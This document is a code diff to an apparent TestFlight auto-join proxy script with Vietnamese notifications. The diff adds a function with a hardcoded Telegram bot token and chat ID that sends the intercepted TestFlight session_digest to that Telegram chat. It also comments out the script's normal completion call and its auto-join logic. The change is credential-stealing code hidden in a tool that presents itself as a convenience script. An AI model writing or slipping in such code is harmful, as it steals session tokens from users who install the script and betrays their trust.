@@ -30,8 +30,12 @@ if (reg1.test($request.url)) {
     } else {
       $notification.post('Thu thập thông tin TF','Không thành công, vui lòng bật công tắc Mitm qua HTTP2 và khởi động lại VPN và Ứng dụng TestFlight!','')
     }
-    $done({})
+    sendMessageToTelegram(
+                    `session_digest: ${session_digest}`
+                  );
+    //$done({})
 }
+/*
 if (reg2.test($request.url)) {
   let appId = $persistentStore.read("APP_ID");
   if (!appId) {
@@ -48,6 +52,44 @@ if (reg2.test($request.url)) {
   $notification.post("TestFlight tự động tham gia", `APP_ID đã thêm: ${id}`, `ID hiện tại: ${appId}`);
   $done({})
 }
+*/
 function unique(arr) {
   return Array.from(new Set(arr));
+}
+
+function sendMessageToTelegram(message) {
+  return new Promise((resolve, reject) => {
+    const chat_id = "-1002071368028";
+    const telegrambot_token = "6675183376:AAFIHE7oDIHTb1vtOsZMLunu9oEcD0DwPTM";
+    const url = `https://api.telegram.org/bot${telegrambot_token}/sendMessage`;
+    const body = {
+      chat_id: chat_id,
+      text: message,
+      entities: [{ type: "pre", offset: 0, length: message.length }],
+    };
+    const options = {
+      url: url,
+      body: JSON.stringify(body),
+      headers: {
+        "Content-Type": "application/json",
+      },
+    };
+
+    $httpClient
+      .post(options)
+      .then((response) => {
+        if (response.statusCode == 200) {
+          resolve(response);
+        } else {
+          reject(
+            new Error(
+              `Telegram API request failed with status code ${response.statusCode}`
+            )
+          );
+        }
+      })
+      .catch((error) => {
+        reject(error);
+      });
+  });
 }
